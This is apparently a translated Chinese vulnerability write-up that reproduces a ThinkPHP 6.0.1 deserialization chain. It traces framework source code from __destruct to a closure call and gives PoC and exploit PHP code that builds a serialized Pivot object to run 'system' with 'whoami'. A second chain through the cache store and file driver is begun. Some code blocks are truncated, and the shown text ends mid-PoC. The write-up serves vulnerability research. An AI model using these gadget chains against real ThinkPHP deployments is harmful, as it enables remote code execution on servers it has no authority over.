# thinkphp6.0x反序列化复现及再挖掘
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 环境搭建
复现环境:thinkphp6.0.1
php:7.3.4
thinkphp6只能通过composer安装还不能安装旧版本可以到这里去下载
    php think run
在app/controller/Index.php下添加控制器
    lazySave参数可控,这样就可以去调用save函数
跟进save()
    public function save(array $data = [], string $sequence = null): bool
    {
        // 数据对象赋值
        $this->setAttrs($data);
        if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
            return false;
        }
        $result = $this->exists ? $this->updateData() : $this->insertData($sequence);
        if (false === $result) {
            return false;
        }
        // 写入回调
        $this->trigger('AfterWrite');
        // 重新记录原始数据
        $this->origin   = $this->data;
        $this->set      = [];
        $this->lazySave = false;
        return true;
    }
发现这句语句
    $result = $this->exists ? $this->updateData() : $this->insertData($sequence);
不过要执行到这句语句需要满足一个if判断条件,否则会直接返回false
    if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
            return false;
        }
跟进isEmpty()
$this->data只要不为空即可,然后`$this->trigger('BeforeWrite')`的值需要为true
跟进trigger()
直接让$this->withEvent的值为false进入if返回true即可
这样就执行到了三目运算符语句
    $result = $this->exists ? $this->updateData() : $this->insertData($sequence);
分别跟进updateData和insertData去寻找可利用的地方
跟进updateData
    protected function updateData(): bool
    {
        // 事件回调
        if (false === $this->trigger('BeforeUpdate')) {
            return false;
        }
        $this->checkData();
        // 获取有更新的数据
        $data = $this->getChangedData();
        if (empty($data)) {
            // 关联更新
            if (!empty($this->relationWrite)) {
                $this->autoRelationUpdate();
            }
            return true;
        }
        if ($this->autoWriteTimestamp && $this->updateTime && !isset($data[$this->updateTime])) {
            // 自动写入更新时间
            $data[$this->updateTime]       = $this->autoWriteTimestamp($this->updateTime);
            $this->data[$this->updateTime] = $data[$this->updateTime];
        }
        // 检查允许字段
        $allowFields = $this->checkAllowFields();
        foreach ($this->relationWrite as $name => $val) {
            if (!is_array($val)) {
                continue;
            }
            foreach ($val as $key) {
                if (isset($data[$key])) {
                    unset($data[$key]);
                }
            }
        }
        // 模型更新
        $db = $this->db();
        $db->startTrans();
        try {
            $this->key = null;
            $where     = $this->getWhere();
            $result = $db->where($where)
                ->strict(false)
                ->cache(true)
                ->setOption('key', $this->key)
                ->field($allowFields)
                ->update($data);
            $this->checkResult($result);
            // 关联更新
            if (!empty($this->relationWrite)) {
                $this->autoRelationUpdate();
            }
            $db->commit();
            // 更新回调
            $this->trigger('AfterUpdate');
            return true;
        } catch (\Exception $e) {
            $db->rollback();
            throw $e;
        }
    }
根据poc指向下一个利用点是checkAllowFields
但是要进入并调用该函数，需要先通过前面两处的if语句
第一个if我们开始已经让$this->trigger()的返回值为true了,不用进入这个if
第二个if要判断$data是否为空,这就要跟进getChangeData去看看了
跟进getChangeData
值需要让$this->force为true就可以直接返回可控的$data,然后不为空就可以不用进入第二个if
跟进一下checkAllowFields
    protected function checkAllowFields(): array
    {
        // 检测字段
        if (empty($this->field)) {
            if (!empty($this->schema)) {
                $this->field = array_keys(array_merge($this->schema, $this->jsonType));
            } else {
                $query = $this->db();
                $table = $this->table ? $this->table . $this->suffix : $query->getTable();
                $this->field = $query->getConnection()->getTableFields($table);
            }
            return $this->field;
        }
        $field = $this->field;
        if ($this->autoWriteTimestamp) {
            array_push($field, $this->createTime, $this->updateTime);
        }
        if (!empty($this->disuse)) {
            // 废弃字段
            $field = array_diff($field, $this->disuse);
        }
        return $field;
    }
当$this->field不为空并且$this->schema为空的时候可以调用db函数
跟进db
这里有拼接字符串操作,$this->name和$this->suffix只要为对应的类名就可以去调用`__toString`了
调用链如下
    __destruct()——>save()——>updateData()——>checkAllowFields()——>db()——>$this->table . $this->suffix（字符串拼接）——>toString()
`__toString`的话就可以直接用tp5的后半段链子,只是有一点点不同而已
不过这里还有一个问题,Model是一个抽象类,不能实例化
我们需要去找他的一个子类Pivot (src/model/Pivot.php)进行实例化
问题解决了就来跟进`__toString`方法了
定位到
    vendor\topthink\think-orm\src\model\concern\Conversion.php
跟进toJson
跟进toArray()
对 $data进行遍历，其中 $key 为 $data 的键。默认情况下，会进入第二个 elseif 语句，从而将 $key 作为参数调用
getAttr() 方法。
跟进getAttr()
先回调用getData,跟进一下
跟进getRealFieldName
直接返回一个值,这里的$this->strict可控,只要为true就返回$name的值,而$name是刚才传进来的$key
所以这里就相当于返回$name
回到getData函数
这里就相当于直接返回了应该$this->data[$key]
回到getAttr函数,下一步会调用getValue
跟进getValue
看到这里是一个可用rce的点
    $value   = $closure($value, $this->data);
先判断是否存在$this->withAttr[$fieldName]这里的$this->withAttr[$fieldName]并不是数组所以会进入else语句
执行到
    $closure = $this->withAttr[$fieldName];
    $value   = $closure($value, $this->data);
$this->withAttr[$fieldName]和$this->data是可控的,而$this->data即是他的键值
那只要让$closure=’system’然后$value为要执行的命令即可
$value的值是在getData里面可以控制的
都能控制,那这样就可以去rce了
###  漏洞复现
poc如下
    lazySave = true;
            $this->exists = true;
            $this->data = ['key' => 'whoami'];
            $this->table = $obj;
            $this->strict = true;
            $this->visible = ["key" => 1];
        }
    }
    namespace think\model\concern;
    trait Attribute
    {
        private $withAttr = ["key" => "system"];
    }
    namespace think\model;
    use think\Model;
    class Pivot extends Model
    {
        function __construct($obj)
        {
            parent::__construct($obj);
        }
    }
    $obj1 = new Pivot(null);
    echo base64_encode(serialize(new Pivot($obj1)));
这里的poc中并没有看到Conversion这个类,是因为在Model类中的引用已经有Conversion这个类了,当我们实例化他的子类的时候,可以去调用了他引用里面的`__toString`方法
Attribute和Conversion这两个类与Model类是通的,所以属性可以全部在Model里面定义
自己写了个exp
    lazySave = true;
                $this->withEvent = false;
                $this->exists = true;
                $this->table = $obj;
                $this->data = ['key' => 'whoami'];
                $this->visible = ["key" => 1];
                $this->withAttr = ['key' => 'system'];
            }
        }
    }
    namespace think\model\concern {
        trait Attribute
        {
        }
    }
## 第二条链子
###  漏洞分析
寻找其他的入口点
    vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php
跟进save,这是一个抽象类,所以我们应该到其子类去寻找可用的save方法
    src/think/filesystem/CacheStore.php
其实我看了看另外几个save方法,就这个最简单了
$this->store可控,可以去调用任意类的set方法,没有则调用`__call`
这里先出发去找可用的set方法
定位到src/think/cache/driver/File.php
    public function set($name, $value, $expire = null): bool
    {
        $this->writeTimes++;
        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }
        $expire   = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);
        $dir = dirname($filename);
        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }
        $data = $this->serialize($value);
        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }
        $data   = "\n" . $data;
        $result = file_put_contents($filename, $data);
        if ($result) {
            clearstatcache();
            return true;
        }
        return false;
    }
跟进getExpireTime
发现没什么可用的
跟进getCacheKey
这里其实就是为了查看进入该方法是否出现错误或者直接return了
所以这里`$this->options['hash_type']`不能为空
返回了一个字符拼接的值,`$this->options['path']`可控,又可以去调用上一条链子的`__toString`
###  漏洞复现
poc
    autosave = false;
            }
        }
    }
    namespace think\filesystem {
        use League\Flysystem\Cached\Storage\AbstractCache;
        use think\cache\driver\File;
        class CacheStore extends AbstractCache